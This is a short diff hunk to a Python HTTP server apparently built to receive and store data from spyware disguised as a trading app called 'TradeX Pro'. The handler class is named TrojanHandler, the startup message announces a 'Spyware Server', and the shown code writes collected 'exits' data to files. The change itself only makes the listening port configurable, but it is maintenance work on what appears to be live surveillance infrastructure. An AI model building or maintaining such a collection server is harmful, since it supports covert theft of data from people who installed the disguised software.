@@ -146,7 +146,7 @@ class TrojanHandler(http.server.BaseHTTPRequestHandler):
                 json.dump(data_store["exits"], f, indent=2)
 
 if __name__ == "__main__":
-    PORT = 9000
+    PORT = int(os.environ.get("PORT", 9000))
     server = http.server.HTTPServer(("0.0.0.0", PORT), TrojanHandler)
     print(f"🦇 TradeX Pro Spyware Server running on port {PORT}")
     print(f"📊 Data stored in: data/")
